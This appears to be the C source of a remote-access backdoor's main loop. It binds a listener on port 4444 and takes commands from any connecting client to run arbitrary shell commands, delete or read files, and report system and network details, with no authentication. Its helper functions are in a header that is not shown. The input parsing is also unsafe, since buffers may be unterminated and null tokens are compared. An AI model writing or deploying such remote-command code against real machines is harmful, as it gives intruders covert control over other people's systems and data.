#include <stdio.h>
#include <string.h>

#include "interface.h"

const char *parse_feature(char input[])
{
    char *token = strtok(input, "(");
    return token;
}

const char *parse_argument(char input[])
{
    char *token;
    strtok(input, "(");
    token = strtok(NULL, ")");
    return token;

}

int main(int argc, char *argv[])
{
    char buffer[1024] = {0};
    char copy[1024] = {0};
    int valread;

    Hndl sockfd = create_socket("127.0.0.1", 4444);
    Hndl bind_result = bind_socket(4444, sockfd);
    Hndl listen_result = listen_socket(1, sockfd);
    Hndl new_socket = accept_socket(sockfd, 4444);

    while (1)
    {
        valread = read_socket(new_socket, buffer, sizeof(buffer));
	strncpy(copy, buffer, sizeof(buffer) - 1);

	const char *feature = parse_feature(buffer);
	const char *argument = parse_argument(copy);

	if (strcmp(feature, "execute") == 0)
	{
            run_command(new_socket, argument);
	}

	else if (strcmp(feature, "delete") == 0)
	{
            delete_file(new_socket, argument);
	}

	else if (strcmp(feature, "sysinfo") == 0)
	{
            system_info(new_socket);
	}

	else if (strcmp(feature, "networking_info") == 0)
	{
            networking_info(new_socket);
	}

	else if (strcmp(feature, "read") == 0)
	{
	    printf("Reading a file\n");
            read_file(new_socket, argument);
	}
    }

    return 0;
}
